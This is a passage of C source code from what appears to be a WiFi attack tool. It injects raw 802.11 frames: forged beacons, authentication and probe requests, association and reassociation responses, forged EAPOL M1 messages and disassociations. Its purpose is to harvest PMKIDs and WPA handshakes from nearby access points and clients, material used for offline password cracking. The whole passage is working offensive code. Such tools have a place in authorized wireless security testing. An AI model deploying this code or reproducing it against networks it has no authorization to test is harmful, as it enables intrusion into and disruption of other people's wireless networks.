		0xdd, 0x06, 0x00, 0x14, 0x6c, 0x00, 0x00, 0x00,
		0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x04, 0x00, 0x1c, 0x00, 0x00
	};
#define CSNETGEARBROADCOM_SIZE sizeof(csnetgearbroadcom)

	static const uint8_t cswilibox[] = {
		0xdd, 0x0f, 0x00, 0x19, 0x3b, 0x02, 0x04, 0x08, 0x00, 0x00,
		    0x00, 0x03, 0x04, 0x01, 0x00, 0x00,
		0x00
	};
#define CSWILIBOX_SIZE sizeof(cswilibox)

	static const uint8_t cscisco[] = {
		0xdd, 0x1d, 0x00, 0x40, 0x96, 0x0c, 0x01, 0xb2, 0xb1, 0x74,
		    0xea, 0x45, 0xc5, 0x65, 0x01, 0x00,
		0x00, 0xb9, 0x16, 0x00, 0x00, 0x00, 0x00, 0x1a, 0xc1, 0xdb,
		    0xf1, 0xf5, 0x05, 0xec, 0xed
	};
#define CSCISCO_SIZE sizeof(cscisco)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(mac_ap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(mac_ap) == false)) {
		return;
	}

	if (checkpownedstaap(mac_mysta, mac_ap) > 0) {
		return;
	}

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + MYAUTHENTICATIONREQUEST_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_AUTH;
	memcpy(macftx->addr1, mac_ap, 6);
	memcpy(macftx->addr2, &mac_mysta, 6);
	memcpy(macftx->addr3, mac_ap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = myauthenticationrequestsequence++ << 4;
	if (myauthenticationrequestsequence >= 4096) {
		myauthenticationrequestsequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM],
	       &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);

	if (stachipset == CS_BROADCOM) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &csbroadcom,
		       CSBROADCOM_SIZE);
		cssize = CSBROADCOM_SIZE;
	} else if (stachipset == CS_APPLE_BROADCOM) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &csapplebroadcom,
		       CSAPPLEBROADCOM_SIZE);
		cssize = CSAPPLEBROADCOM_SIZE;
	} else if (stachipset == CS_SONOS) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &cssonos, CSSONOS_SIZE);
		cssize = CSSONOS_SIZE;
	} else if (stachipset == CS_NETGEARBROADCOM) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &csnetgearbroadcom,
		       CSNETGEARBROADCOM_SIZE);
		cssize = CSNETGEARBROADCOM_SIZE;
	} else if (stachipset == CS_WILIBOX) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &cswilibox,
		       CSWILIBOX_SIZE);
		cssize = CSWILIBOX_SIZE;
	} else if (stachipset == CS_CISCO) {
		memcpy(&packetout
		       [HDRRT_SIZE + MAC_SIZE_NORM +
			MYAUTHENTICATIONREQUEST_SIZE], &cscisco, CSCISCO_SIZE);
		cssize = CSCISCO_SIZE;
	} else {
		cssize = 0;
	}

	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + MYAUTHENTICATIONREQUEST_SIZE +
	     cssize) < 0) {
		perror("\nfailed to transmit authenticationrequest");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline void send_directed_proberequest(uint8_t * macap, int essid_len,
					      uint8_t * essid)
{
	static mac_t *macftx;
	static uint8_t *beaconptr;
	static int beaconlen;
	static uint8_t *essidtagptr;
	static ietag_t *essidtag;

	static const uint8_t directedproberequestdata[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
		0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
	};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macap) == false)) {
		return;
	}
	if (checkpownedstaap(mac_mysta, macap) != 0) {
		return;
	}
	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + ESSID_LEN_MAX +
	       DIRECTEDPROBEREQUEST_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
	memcpy(macftx->addr1, macap, 6);
	memcpy(macftx->addr2, &mac_mysta, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->sequence = myproberequestsequence++ << 4;
	if (myproberequestsequence >= 4096) {
		myproberequestsequence = 0;
	}

	beaconptr = payload_ptr + CAPABILITIESAP_SIZE;
	beaconlen = payload_len - CAPABILITIESAP_SIZE;

	essidtagptr = gettag(TAG_SSID, beaconptr, beaconlen);
	if (essidtagptr == NULL) {
		return;
	}
	essidtag = (ietag_t *) essidtagptr;
	if (essidtag->len > ESSID_LEN_MAX) {
		return;
	}
	packetout[HDRRT_SIZE + MAC_SIZE_NORM] = 0;
	packetout[HDRRT_SIZE + MAC_SIZE_NORM + 1] = essid_len;
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM + IETAG_SIZE], essid,
	       essid_len);
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM + IETAG_SIZE + essid_len],
	       &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + IETAG_SIZE + essid_len +
	     DIRECTEDPROBEREQUEST_SIZE) < 0) {
		perror("\nfailed to transmit directed proberequest");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline void send_undirected_proberequest()
{
	static mac_t *macftx;

	static const uint8_t undirectedproberequestdata[] = {
		0x00, 0x00,
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
		0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
	};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

	static uint8_t packetout[1024];

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + ESSID_LEN_MAX +
	       UNDIRECTEDPROBEREQUEST_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
	memcpy(macftx->addr1, &mac_broadcast, 6);
	memcpy(macftx->addr2, &mac_mysta, 6);
	memcpy(macftx->addr3, &mac_broadcast, 6);
	macftx->sequence = myproberequestsequence++ << 4;
	if (myproberequestsequence >= 4096) {
		myproberequestsequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM],
	       &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + UNDIRECTEDPROBEREQUEST_SIZE) < 0) {
		perror("\nfailed to transmit undirected proberequest");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static void send_broadcastbeacon()
{
	static mac_t *macftx;
	static capap_t *capap;

	static const uint8_t broadcastbeacondata[] = {
		0x00, 0x00,
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
		0x03, 0x01, 0x0d,
		0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
		0x2a, 0x01, 0x00,
		0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
		0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47,
		    0x0d, 0x00,
		0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00,
		    0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
		0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
		0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00,
		    0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
		0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
		0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff,
		    0x7f,
		0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00,
		0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
		    0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
		0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
		0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01,
		    0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
		0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
	};
#define BROADCASTBEACON_SIZE sizeof(broadcastbeacondata)

	static uint8_t packetout[HDRRT_SIZE + MAC_SIZE_NORM +
				 CAPABILITIESAP_SIZE + BROADCASTBEACON_SIZE +
				 1];

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE +
	       BROADCASTBEACON_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_BEACON;
	memcpy(macftx->addr1, &mac_broadcast, 6);
	memcpy(macftx->addr2, &mac_myap, 6);
	memcpy(macftx->addr3, &mac_myap, 6);
	macftx->sequence = mybeaconsequence++ << 4;
	if (mybeaconsequence >= 4096) {
		mybeaconsequence = 0;
	}
	capap = (capap_t *) (packetout + HDRRT_SIZE + MAC_SIZE_NORM);
	capap->timestamp = mytime++;
	capap->beaconintervall = 0x64;
	capap->capabilities = 0x431;
	packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE] = 0;
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE],
	       &broadcastbeacondata, BROADCASTBEACON_SIZE);
	packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE + 0x0e] =
	    channelscanlist[cpa];

	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE +
	     BROADCASTBEACON_SIZE) < 0) {
		perror("\nfailed to transmit broadcast beacon");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline bool detectpmkid(uint16_t authlen, uint8_t * authpacket)
{
	static pmkid_t *pmkid;

	static uint8_t pmkidoui[] = { 0x00, 0x0f, 0xac };
#define PMKIDOUI_SIZE sizeof(pmkidoui)

	if (authlen < WPAKEY_SIZE + PMKID_SIZE) {
		return false;
	}
	pmkid = (pmkid_t *) (authpacket + WPAKEY_SIZE);

	if ((pmkid->id != 0xdd) && (pmkid->id != 0x14)) {
		return false;
	}
	if (memcmp(&pmkidoui, pmkid->oui, PMKIDOUI_SIZE) != 0) {
		return false;
	}
	if (pmkid->type != 0x04) {
		return false;
	}
	if (memcmp(pmkid->pmkid, &nulliv, 16) == 0) {
		return false;
	}
	return true;
}

/*===========================================================================*/
static inline bool process80211eap()
{
	static uint8_t *eapauthptr;
	static eapauth_t *eapauth;
	static int eapauthlen;
	static uint16_t authlen;
	static wpakey_t *wpak;
	static uint16_t keyinfo;
	static unsigned long long int rc;
	static int calceapoltimeout;

	static exteap_t *exteap;
	static uint16_t exteaplen;

	eapauthptr = payload_ptr + LLC_SIZE;
	eapauthlen = payload_len - LLC_SIZE;
	eapauth = (eapauth_t *) eapauthptr;
	authlen = ntohs(eapauth->len);
	if (authlen > (eapauthlen - 4)) {
		return false;
	}
	if (eapauth->type == EAPOL_KEY) {
		wpak = (wpakey_t *) (eapauthptr + EAPAUTH_SIZE);
		keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
		rc = be64toh(wpak->replaycount);
		if (keyinfo == 1) {
			if ((authlen == 95)
			    && (memcmp(macfrx->addr1, &mac_mysta, 6) == 0)) {
				addpownedstaap(macfrx->addr1, macfrx->addr2,
					       RX_M1);
				return false;
			}
			if (fd_pcapng != 0) {
				writeepb(fd_pcapng);
			}
			if (rc == rcrandom) {
				memcpy(&laststam1, macfrx->addr1, 6);
				memcpy(&lastapm1, macfrx->addr2, 6);
				lastrcm1 = rc;
				lasttimestampm1 = timestamp;
				return false;
			}
			if (authlen > 95) {
				if (detectpmkid
				    (authlen,
				     eapauthptr + EAPAUTH_SIZE) == true) {
					if ((addpownedstaap
					     (macfrx->addr1, macfrx->addr2,
					      RX_PMKID) & RX_PMKID) !=
					    RX_PMKID) {
						if ((statusout & STATUS_EAPOL)
						    == STATUS_EAPOL) {
							printtimenet(macfrx->
								     addr1,
								     macfrx->
								     addr2);
							if (memcmp
							    (macfrx->addr1,
							     &mac_mysta,
							     6) == 0) {
								fprintf(stdout,
									" [FOUND PMKID CLIENT-LESS]\n");
							} else {
								fprintf(stdout,
									" [FOUND PMKID]\n");
							}
						}
					}
					return false;
				}
			}
			return false;
		}
		if (keyinfo == 3) {
			if (fd_pcapng != 0) {
				writeepb(fd_pcapng);
			}
			calceapoltimeout = timestamp - lasttimestampm2;
			if ((calceapoltimeout < eapoltimeout)
			    && ((rc - lastrcm2) == 1)
			    && (memcmp(&laststam2, macfrx->addr1, 6) == 0)
			    && (memcmp(&lastapm2, macfrx->addr2, 6) == 0)) {
				if (addpownedstaap
				    (macfrx->addr1, macfrx->addr2,
				     RX_M23) == false) {
					if ((statusout & STATUS_EAPOL) ==
					    STATUS_EAPOL) {
						printtimenet(macfrx->addr1,
							     macfrx->addr2);
						fprintf(stdout,
							" [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT %d]\n",
							calceapoltimeout);
					}
				}
			}
			memset(&laststam2, 0, 6);
			memset(&lastapm2, 0, 6);
			lastrcm2 = 0;
			lasttimestampm2 = 0;
			return false;
		}
		if (keyinfo == 2) {
			calceapoltimeout = timestamp - lasttimestampm1;
			if ((rc == rcrandom)
			    && (memcmp(&laststam1, macfrx->addr2, 6) == 0)
			    && (memcmp(&lastapm1, macfrx->addr1, 6) == 0)) {
				if (fd_pcapng != 0) {
					writeepbm2(fd_pcapng);
				}
				if (addpownedstaap
				    (macfrx->addr2, macfrx->addr1,
				     RX_M12) == false) {
					if ((statusout & STATUS_EAPOL) ==
					    STATUS_EAPOL) {
						printtimenet(macfrx->addr1,
							     macfrx->addr2);
						fprintf(stdout,
							" [FOUND HANDSHAKE AP-LESS, EAPOL TIMEOUT %d]\n",
							calceapoltimeout);
					}
				}
				return false;
			}
			if (fd_pcapng != 0) {
				writeepb(fd_pcapng);
			}
			memcpy(&laststam2, macfrx->addr2, 6);
			memcpy(&lastapm2, macfrx->addr1, 6);
			lastrcm2 = rc;
			lasttimestampm2 = timestamp;
			return false;
		}
		if (keyinfo == 4) {
			if (fd_pcapng != 0) {
				writeepb(fd_pcapng);
			}
			if (checkpownedstaap(macfrx->addr2, macfrx->addr1) ==
			    false) {
				if (disassociationflag == false) {
					send_disassociation(macfrx->addr2,
							    macfrx->addr1,
							    WLAN_REASON_DISASSOC_AP_BUSY);
				}
			}
			memset(&laststam2, 0, 6);
			memset(&lastapm2, 0, 6);
			lastrcm2 = 0;
			lasttimestampm2 = 0;
			return false;
		} else {
			if (fd_pcapng != 0) {
				writeepb(fd_pcapng);
			}
		}
		return false;
	}
	if (eapauth->type == EAP_PACKET) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		exteap = (exteap_t *) (eapauthptr + EAPAUTH_SIZE);
		exteaplen = ntohs(exteap->extlen);
		if ((eapauthlen != exteaplen + 4) && (exteaplen -= 5)) {
			return false;
		}
		if (exteap->exttype == EAP_TYPE_ID) {
			if ((exteap->code == EAP_CODE_REQ)
			    && (exteap->data[0] != 0)) {
				if ((statusout & STATUS_EAPOL) == STATUS_EAPOL) {
					printtimenet(macfrx->addr1,
						     macfrx->addr2);
					printid(exteaplen - 5, exteap->data);
					fprintf(stdout,
						" [EAP REQUEST ID, SEQUENCE %d]\n",
						macfrx->sequence >> 4);
				}
			}
			if ((exteap->code == EAP_CODE_RESP)
			    && (exteap->data[0] != 0)) {
				if ((statusout & STATUS_EAPOL) == STATUS_EAPOL) {
					printtimenet(macfrx->addr1,
						     macfrx->addr2);
					printid(exteaplen - 5, exteap->data);
					fprintf(stdout,
						" [EAP RESPONSE ID, SEQUENCE %d]\n",
						macfrx->sequence >> 4);
				}
			}
		}
		return false;
	}

	if (eapauth->type == EAPOL_START) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if (attackclientflag == false) {
			send_requestidentity(macfrx->addr2, macfrx->addr1);
		}
		return false;
	}
	if (eapauth->type == EAPOL_LOGOFF) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		return false;
	}
	if (eapauth->type == EAPOL_ASF) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		return false;
	}
	if (eapauth->type == EAPOL_MKA) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		return false;
	}

/* for unknown EAP types */
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	return false;
}

/*===========================================================================*/
/*===========================================================================*/
static void send_m1(uint8_t * macsta, uint8_t * macap)
{
	static mac_t *macftx;

	static const uint8_t anoncewpa2data[] = {
		0x88, 0x02, 0x3a, 0x01,
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
		0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
		0x21, 0x22, 0x23, 0x24, 0x25, 0x26,
		0x00, 0x00, 0x06, 0x00,
		0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
		0x02,
		0x03,
		0x00, 0x5f,
		0x02,
		0x00, 0x8a,
		0x00, 0x10,
	};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}
	if (checkpownedstaap(macsta, macap) >= 3) {
		return;
	}

	memset(&packetout, 0, HDRRT_SIZE + 140);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	memcpy(&packetout[HDRRT_SIZE], &anoncewpa2data, ANONCEWPA2_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);

	packetout[HDRRT_SIZE + ANONCEWPA2_SIZE + 7] = rcrandom & 0xff;
	packetout[HDRRT_SIZE + ANONCEWPA2_SIZE + 6] = (rcrandom >> 8) & 0xff;
	memcpy(&packetout[HDRRT_SIZE + ANONCEWPA2_SIZE + 8], &anoncerandom, 32);
	if (write(fd_socket, packetout, HDRRT_SIZE + 133) < 0) {
		perror("\nfailed to transmit M1");
		errorcount++;
		outgoingcount--;
	}
	outgoingcount++;
	fsync(fd_socket);
	macftx->retry = 1;
	if (write(fd_socket, packetout, HDRRT_SIZE + 133) < 0) {
		perror("\nfailed to retransmit M1");
		errorcount++;
		outgoingcount--;
	}
	outgoingcount++;
	fsync(fd_socket);
	return;
}

/*===========================================================================*/
static inline void process80211reassociation_resp()
{
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		return;
	}
	send_m1(macfrx->addr1, macfrx->addr2);
	if ((statusout & STATUS_ASSOC) == STATUS_ASSOC) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [REASSOCIATIONRESPONSE, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	return;
}

/*===========================================================================*/
static void send_reassociationresponse(uint8_t * macsta, uint8_t * macap)
{
	static mac_t *macftx;

	static const uint8_t associationresponsedata[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
		0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
		0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47,
		    0x0d, 0x00,
		0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00,
		    0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
		0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
		0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00,
		    0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
		0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
	};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

	static const uint8_t associationid[] = {
		0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
	};
#define ASSOCIATIONID_SIZE sizeof(associationid)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}
	if (checkpownedstaap(macsta, macap) > RX_PMKID) {
		return;
	}

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE +
	       ASSOCIATIONRESPONSE_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = myassociationresponsesequence++ << 4;
	if (myassociationresponsesequence >= 4096) {
		myassociationresponsesequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM], &associationid,
	       ASSOCIATIONID_SIZE);
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE],
	       &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE +
	     ASSOCIATIONRESPONSE_SIZE) < 0) {
		perror("\nfailed to transmit reassociationresponse");
		errorcount++;
		outgoingcount--;
	}
	outgoingcount++;
	fsync(fd_socket);
	return;
}

/*===========================================================================*/
static inline void process80211reassociation_req()
{
	static uint8_t *essidtag_ptr;
	static ietag_t *essidtag;
	static uint8_t *reassociationrequest_ptr;
	static int reassociationrequestlen;

	if (attackclientflag == false) {
		send_reassociationresponse(macfrx->addr2, macfrx->addr1);
		usleep(M1WAITTIME);
		send_m1(macfrx->addr2, macfrx->addr1);
	}

	if (payload_len < (int) CAPABILITIESSTA_SIZE) {
		return;
	}
	reassociationrequest_ptr = payload_ptr + CAPABILITIESREQSTA_SIZE;
	reassociationrequestlen = payload_len - CAPABILITIESREQSTA_SIZE;
	if (reassociationrequestlen < (int) IETAG_SIZE) {
		return;
	}

	essidtag_ptr =
	    gettag(TAG_SSID, reassociationrequest_ptr, reassociationrequestlen);
	if (essidtag_ptr == NULL) {
		return;
	}
	essidtag = (ietag_t *) essidtag_ptr;
	if (essidtag->len > ESSID_LEN_MAX) {
		return;
	}
	if ((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX)
	    || (essidtag->data[0] == 0)) {
		return;
	}

	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}

	if ((statusout & STATUS_ASSOC) == STATUS_ASSOC) {
		printtimenet(macfrx->addr1, macfrx->addr2);
//      printessid(essidtag_ptr);
		fprintf(stdout, " [REASSOCIATIONREQUEST, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	return;
}

/*===========================================================================*/
static void send_associationresponse(uint8_t * macsta, uint8_t * macap)
{
	static mac_t *macftx;

	static const uint8_t associationresponsedata[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
		0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
		0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47,
		    0x0d, 0x00,
		0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00,
		    0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
		0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
		0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00,
		    0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
		0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
	};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

	static const uint8_t associationid[] = {
		0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
	};
#define ASSOCIATIONID_SIZE sizeof(associationid)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}
	if (checkpownedstaap(macsta, macap) > RX_M1) {
		return;
	}
	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE +
	       ASSOCIATIONRESPONSE_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->duration = 0x013a;
	macftx->sequence = myassociationresponsesequence++ << 4;
	if (myassociationresponsesequence >= 4096) {
		myassociationresponsesequence = 0;
	}
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM], &associationid,
	       ASSOCIATIONID_SIZE);
	memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE],
	       &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + ASSOCIATIONID_SIZE +
	     ASSOCIATIONRESPONSE_SIZE) < 0) {
		perror("\nfailed to transmit associationresponse");
		errorcount++;
		outgoingcount--;
	}
	outgoingcount++;
	fsync(fd_socket);
	return;
}

/*===========================================================================*/
static inline void process80211association_resp()
{
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		return;
	}
	send_m1(macfrx->addr1, macfrx->addr2);
	if ((statusout & STATUS_ASSOC) == STATUS_ASSOC) {
		printtimenet(macfrx->addr1, macfrx->addr2);
